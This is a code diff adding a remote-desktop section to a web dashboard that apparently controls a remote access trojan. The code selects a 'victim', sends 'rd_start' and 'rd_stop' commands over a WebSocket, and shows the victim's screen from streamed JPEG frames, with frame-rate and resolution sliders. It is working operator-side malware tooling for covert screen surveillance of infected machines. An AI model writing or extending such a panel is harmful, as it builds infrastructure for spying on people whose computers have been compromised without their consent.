@@ -1,6 +1,185 @@
 "use client";
 
+import { useEffect } from "react";
+
+import { usePanelDetailView } from "../panel-detail-view-provider";
+import { usePanelWS } from "../../../ws/ws-provider";
+import { showToast } from "../../../toast";
+
 export function RemoteDesktopSection() {
+  const detail = usePanelDetailView();
+  const ws = usePanelWS();
+
+  useEffect(() => {
+    const loader = document.getElementById("remoteDesktopLoader");
+    const screen = document.getElementById("remoteDesktopScreen");
+    const stream = document.getElementById("remoteDesktopStream");
+    const startBtn = document.getElementById("remoteDesktopStartBtn") as HTMLButtonElement | null;
+    const panel = document.getElementById("remoteDesktopPanel");
+    const fpsSlider = document.getElementById("remoteDesktopFps") as HTMLInputElement | null;
+    const fpsValue = document.getElementById("remoteDesktopFpsValue");
+    const resSlider = document.getElementById("remoteDesktopResolution") as HTMLInputElement | null;
+    const resValue = document.getElementById("remoteDesktopResolutionValue");
+
+    if (!loader || !screen || !startBtn || !panel || !stream) return;
+
+    let isRunning = false;
+    let isLoaded = false;
+    let loadTimer: number | null = null;
+
+    const syncSlider = (slider: HTMLInputElement | null, out: HTMLElement | null) => {
+      if (!slider || !out) return;
+      const fn = () => {
+        try {
+          out.textContent = String(slider.value || "").trim();
+        } catch {
+        }
+      };
+      slider.addEventListener("input", fn);
+      slider.addEventListener("change", fn);
+      fn();
+      return () => {
+        slider.removeEventListener("input", fn);
+        slider.removeEventListener("change", fn);
+      };
+    };
+
+    const unFps = syncSlider(fpsSlider, fpsValue);
+    const unRes = syncSlider(resSlider, resValue);
+
+    const applyUi = () => {
+      const connected = ws.state === "open" && !!detail.selectedVictimId;
+      const showLoader = !connected || !isLoaded;
+
+      loader.style.display = showLoader ? "block" : "none";
+      screen.style.display = showLoader ? "none" : "block";
+      panel.style.display = showLoader ? "none" : "block";
+
+      startBtn.disabled = showLoader;
+      startBtn.textContent = isRunning ? "Stop" : "Start";
+
+      if (!connected) {
+        isRunning = false;
+        stream.style.display = "none";
+        startBtn.textContent = "Start";
+      }
+    };
+
+    const startLoad = () => {
+      const connected = ws.state === "open" && !!detail.selectedVictimId;
+      if (!connected) {
+        isLoaded = false;
+        applyUi();
+        return;
+      }
+      if (isLoaded) {
+        applyUi();
+        return;
+      }
+
+      applyUi();
+      if (loadTimer != null) {
+        window.clearTimeout(loadTimer);
+        loadTimer = null;
+      }
+      loadTimer = window.setTimeout(() => {
+        isLoaded = true;
+        applyUi();
+      }, 700);
+    };
+
+    const onStartStop = () => {
+      if (startBtn.disabled) return;
+      const victimId = detail.selectedVictimId;
+      if (!victimId) {
+        showToast("error", "Select victim first");
+        return;
+      }
+      if (ws.state !== "open") {
+        showToast("error", "WebSocket is not connected");
+        return;
+      }
+
+      isRunning = !isRunning;
+
+      if (isRunning) {
+        const fps = fpsSlider ? parseInt(String(fpsSlider.value || "30"), 10) : 30;
+        const resPct = resSlider ? parseInt(String(resSlider.value || "75"), 10) : 75;
+        const ok = ws.sendJson({
+          type: "rd_start",
+          victim_id: String(victimId),
+          fps: Number.isFinite(fps) ? fps : 30,
+          resolution_percent: Number.isFinite(resPct) ? resPct : 75,
+        });
+        if (!ok) {
+          isRunning = false;
+          showToast("error", "Failed to start remote desktop");
+        }
+      } else {
+        ws.sendJson({
+          type: "rd_stop",
+          victim_id: String(victimId),
+        });
+      }
+
+      stream.style.display = isRunning ? "block" : "none";
+      applyUi();
+    };
+
+    startBtn.addEventListener("click", onStartStop);
+
+    const onWsMsg = (ev: CustomEvent<Record<string, unknown>>) => {
+      const msg = ev.detail;
+      const t = String((msg as any).type || "");
+      if (t !== "rd_frame") return;
+
+      const victId = String((msg as any).victim_id || (msg as any).victimId || (msg as any).id || "").trim();
+      if (!victId) return;
+      if (!detail.selectedVictimId || String(detail.selectedVictimId) !== victId) return;
+      if (!isRunning) return;
+
+      const data = (msg as any).data;
+      if (!data || typeof data !== "string") return;
+
+      let img: HTMLImageElement | null = null;
+      try {
+        img = stream.querySelector("img");
+      } catch {
+        img = null;
+      }
+      if (!img) {
+        img = document.createElement("img");
+        img.alt = "Remote Desktop";
+        img.style.maxWidth = "100%";
+        img.style.height = "auto";
+        img.style.display = "block";
+        img.draggable = false;
+        try {
+          stream.textContent = "";
+        } catch {
+        }
+        stream.appendChild(img);
+      }
+      img.src = "data:image/jpeg;base64," + data;
+    };
+
+    window.addEventListener("webrat_ws_message", onWsMsg as EventListener);
+
+    startLoad();
+    applyUi();
+
+    return () => {
+      if (loadTimer != null) window.clearTimeout(loadTimer);
+      startBtn.removeEventListener("click", onStartStop);
+      window.removeEventListener("webrat_ws_message", onWsMsg as EventListener);
+      try {
+        unFps && unFps();
+        unRes && unRes();
+      } catch {
+      }
+    };
+  }, [detail.selectedVictimId, ws]);
+
   return (
     <div className="detail-section h-full">
       <div className="relative h-full w-full">
